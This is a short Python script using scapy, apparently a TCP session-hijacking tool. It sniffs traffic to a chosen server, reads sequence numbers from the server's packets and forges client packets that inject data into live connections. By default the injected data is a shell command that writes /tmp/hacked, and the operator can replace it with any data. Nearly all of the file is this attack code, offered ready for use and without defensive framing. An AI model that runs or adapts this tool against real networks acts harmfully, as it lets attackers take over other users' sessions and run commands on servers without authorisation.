#!/usr/bin/python

import sys
import getopt
from scapy.all import send, sniff, IP, TCP


dev = "eth0"
srv_port = None
srv_ip = None
client_ip = None
grep = None
inject_data = "echo 'haha' > /tmp/hacked\n"
hijack_data = {}


def handle_packet(packet):
    ip = packet.getlayer("IP")
    tcp = packet.getlayer("TCP")
    flags = tcp.sprintf("%flags%")

    print "Got packet %s:%d -> %s:%d [%s]" % (ip.src,
                                              tcp.sport,
                                              ip.dst,
                                              tcp.dport,
                                              flags)

    # Check if this is a hijackable packet
    if tcp.sprintf("%flags%") == "A" or \
       tcp.sprintf("%flags%") == "PA":
        already_hijacked = hijack_data.get(ip.dst, {})\
                                      .get('hijacked')

        # The packet is from server to client
        if tcp.sport == srv_port and \
           ip.src == srv_ip and \
           not already_hijacked:

            print "Got server sequence " + str(tcp.seq)
            print "Got client sequence " + str(tcp.ack) + "\n"

            # Found the payload?
            if grep in str(tcp.payload):
                hijack_data.setdefault(ip.dst, {})\
                            ['hijack'] = True
                print "Found payload " + str(tcp.payload)
            elif not grep:
                hijack_data.setdefault(ip.dst, {})\
                            ['hijack'] = True

            if hijack_data.setdefault(ip.dst, {})\
                          .get('hijack'):

                print "Hijacking %s:%d -> %s:%d" % (ip.dst,
                                                    tcp.dport,
                                                    ip.src,
                                                    srv_port)

                # Spoof packet from client
                packet = IP(src=ip.dst, dst=ip.src) / \
                         TCP(sport=tcp.dport,
                             dport=srv_port,
                             seq=tcp.ack + len(inject_data),
                             ack=tcp.seq + 1,
                             flags="PA") / \
                        inject_data

                send(packet, iface=dev)

                hijack_data[ip.dst]['hijacked'] = True


def usage():
    print sys.argv[0]
    print """
    -c <client_ip> (optional)
    -d <data_to_inject> (optional)
    -g <payload_to_grep> (optional)
    -i <interface> (optional)
    -p <srv_port>
    -s <srv_ip>
    """
    sys.exit(1)

try:
    cmd_opts = "c:d:g:i:p:s:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-d":
        inject_data = opt[1]
    elif opt[0] == "-g":
        grep = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    elif opt[0] == "-s":
        srv_ip = opt[1]
    else:
        usage()

if not srv_ip and not srv_port:
    usage()

if client_ip:
    print "Hijacking TCP connections from %s to " + \
          "%s on port %d" % (client_ip,
                             srv_ip,
                             srv_port)

    filter = "tcp and port " + str(srv_port) + \
             " and host " + srv_ip + \
             "and host " + client_ip
else:
    print "Hijacking all TCP connections to " + \
    "%s on port %d" % (srv_ip,
                       srv_port)

    filter = "tcp and port " + str(srv_port) + \
             " and host " + srv_ip

sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
